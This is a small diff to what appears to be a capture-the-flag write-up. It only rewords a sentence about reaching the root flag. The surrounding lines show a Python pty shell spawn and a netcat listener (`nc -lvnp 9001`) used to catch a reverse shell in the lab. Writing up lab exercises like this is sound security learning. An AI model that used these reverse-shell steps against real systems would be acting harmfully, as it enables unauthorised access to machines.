@@ -598,7 +598,7 @@ import pty
 pty.spawn("sh")
 ```
 
-After a minute, we get a reverse shell and can access the final flag!: 
+After a minute, we get a reverse shell and can finally access the root flag!: 
 ```text
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9001
